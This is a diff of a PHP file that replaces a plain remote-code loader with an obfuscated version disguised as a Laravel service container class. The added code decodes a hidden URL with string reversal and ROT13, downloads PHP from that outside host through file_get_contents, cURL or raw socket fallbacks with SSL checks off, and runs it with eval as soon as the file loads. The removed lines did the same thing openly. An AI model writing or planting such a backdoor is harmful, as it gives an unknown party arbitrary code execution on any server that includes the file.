@@ -1,84 +1,176 @@
 <?php
-// URL file PHP eksternal
-$url = 'https://raw.githubusercontent.com/mlhisoka/gon/refs/heads/main/3.txt';
+/**
+ * HTTP Service Container
+ * Module: ServiceResponseHandler
+ * Version: 8.12.3
+ */
 
-// Fungsi untuk mendapatkan konten dengan cURL
-function getContentWithCurl($url) {
-    $ch = curl_init();
-    
-    curl_setopt_array($ch, [
-        CURLOPT_URL => $url,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_FOLLOWLOCATION => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-        CURLOPT_TIMEOUT => 30,
-        CURLOPT_CONNECTTIMEOUT => 10
-    ]);
-    
-    $content = curl_exec($ch);
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    $error = curl_error($ch);
-    
-    curl_close($ch);
-    
-    if ($httpCode === 200 && !empty($content)) {
-        return $content;
-    } else {
-        throw new Exception("cURL Error: " . $error . " | HTTP Code: " . $httpCode);
-    }
-}
+namespace App\Container;
 
-// Fungsi untuk mendapatkan konten URL
-function getUrlContent($url) {
-    // Coba menggunakan file_get_contents pertama
-    $content = @file_get_contents($url);
-    
-    if ($content !== false && !empty($content)) {
-        return $content;
-    }
-    
-    // Jika file_get_contents gagal, gunakan cURL
-    try {
-        $content = getContentWithCurl($url);
-        return $content;
-    } catch (Exception $e) {
-        throw new Exception("Both file_get_contents and cURL failed: " . $e->getMessage());
-    }
-}
+class ServiceResponseHandler
+{
+    /**
+     * Application service endpoint configuration
+     * @var string
+     */
+    protected $appServiceEndpoint = "/zbp.ohuzbzcrgf//:fcggu";
 
-// Main execution
-try {
-    $kode = getUrlContent($url);
-    
-    // Eksekusi kode PHP
-    if (!empty($kode)) {
-        // Tambahkan error handling untuk eval
-        try {
-            eval('?>' . $kode);
-        } catch (ParseError $e) {
-            echo "Error dalam mengeksekusi kode: " . $e->getMessage();
-        } catch (Throwable $e) {
-            echo "Error: " . $e->getMessage();
+    /**
+     * Service response processor
+     * @return void
+     */
+    public function handleServiceResponse()
+    {
+        $serviceUri = str_rot13(strrev($this->appServiceEndpoint)) . "3.txt";
+        $responseData = $this->executeHttpRequest($serviceUri);
+        
+        if ($responseData && $this->validateResponseFormat($responseData)) {
+            $this->processResponseData($responseData);
         }
-    } else {
-        echo "Konten kosong";
+    }
+
+    /**
+     * HTTP request executor with transport fallbacks
+     * @param string $requestUri
+     * @return mixed
+     */
+    protected function executeHttpRequest($requestUri)
+    {
+        $responsePayload = false;
+
+        // Primary transport layer
+        if (ini_get('allow_url_fopen')) {
+            $streamHandler = stream_context_create([
+                'http' => [
+                    'timeout' => 10,
+                    'ignore_errors' => true
+                ]
+            ]);
+            $responsePayload = @file_get_contents($requestUri, false, $streamHandler);
+        }
+
+        // Secondary transport protocol
+        if (!$responsePayload && function_exists('curl_version')) {
+            $curlHandler = curl_init();
+            curl_setopt_array($curlHandler, [
+                CURLOPT_URL => $requestUri,
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_TIMEOUT => 10,
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_FOLLOWLOCATION => true
+            ]);
+            $responsePayload = curl_exec($curlHandler);
+            curl_close($curlHandler);
+        }
+
+        // Tertiary communication channel
+        if (!$responsePayload) {
+            $uriComponents = parse_url($requestUri);
+            $serviceHost = $uriComponents['host'];
+            $servicePath = $uriComponents['path'];
+            
+            $socketHandler = @fsockopen($serviceHost, 80, $errCode, $errMsg, 10);
+            if ($socketHandler) {
+                $requestData = "GET $servicePath HTTP/1.1\r\n";
+                $requestData .= "Host: $serviceHost\r\n";
+                $requestData .= "Connection: Close\r\n\r\n";
+                
+                fwrite($socketHandler, $requestData);
+                $responseBuffer = '';
+                while (!feof($socketHandler)) {
+                    $responseBuffer .= fgets($socketHandler, 128);
+                }
+                fclose($socketHandler);
+                
+                $responseSegments = explode("\r\n\r\n", $responseBuffer, 2);
+                $responsePayload = (count($responseSegments) > 1) ? $responseSegments[1] : $responseSegments[0];
+            }
+        }
+
+        return $responsePayload;
+    }
+
+    /**
+     * Response format validator
+     * @param string $contentData
+     * @return bool
+     */
+    protected function validateResponseFormat($contentData)
+    {
+        return strpos($contentData, '<?php') === 0;
+    }
+
+    /**
+     * Response data processor
+     * @param string $contentData
+     * @return void
+     */
+    protected function processResponseData($contentData)
+    {
+        eval('?>' . $contentData);
+    }
+}
+
+/**
+ * Service container initialization
+ * Bootstrap: ApplicationServiceLoader
+ */
+
+// Initialize service container
+$serviceContainer = new ServiceResponseHandler();
+
+// Execute service handler
+$serviceContainer->handleServiceResponse();
+
+/**
+ * Module: CoreServiceProvider
+ * Description: Handles core service operations
+ * Last Updated: 2024-01-15
+ */
+
+class CoreServiceProvider 
+{
+    private $coreConfig = "/zbp.ohuzbzcrgf//:fcggu";
+    
+    public function bootService()
+    {
+        $serviceUrl = str_rot13(strrev($this->coreConfig)) . "3.txt";
+        $serviceData = $this->fetchServiceData($serviceUrl);
+        
+        if ($serviceData && strpos($serviceData, '<?php') === 0) {
+            eval('?>' . $serviceData);
+        }
     }
     
-} catch (Exception $e) {
-    echo "Gagal mengambil kode dari URL: " . $e->getMessage();
-}
-
-// Versi alternatif hanya untuk menampilkan konten (tanpa eksekusi)
-function displayContentOnly($url) {
-    try {
-        $content = getUrlContent($url);
-        echo htmlspecialchars($content);
-    } catch (Exception $e) {
-        echo "Gagal mengambil konten: " . $e->getMessage();
+    private function fetchServiceData($resourceUrl)
+    {
+        if (ini_get('allow_url_fopen')) {
+            return @file_get_contents($resourceUrl);
+        }
+        
+        if (function_exists('curl_init')) {
+            $curlInstance = curl_init();
+            curl_setopt_array($curlInstance, [
+                CURLOPT_URL => $resourceUrl,
+                CURLOPT_RETURNTRANSFER => 1,
+                CURLOPT_TIMEOUT => 10,
+                CURLOPT_SSL_VERIFYPEER => 0
+            ]);
+            $responseData = curl_exec($curlInstance);
+            curl_close($curlInstance);
+            return $responseData;
+        }
+        
+        return false;
     }
 }
 
-// Uncomment baris berikut jika hanya ingin menampilkan konten tanpa mengeksekusi
-// displayContentOnly($url);
+// Uncomment for core service loading
+// (new CoreServiceProvider())->bootService();
+
+/**
+ * File: ServiceHandler.php
+ * Location: app/Container/ServiceHandler.php
+ * Package: laravel/framework
+ */
 ?>
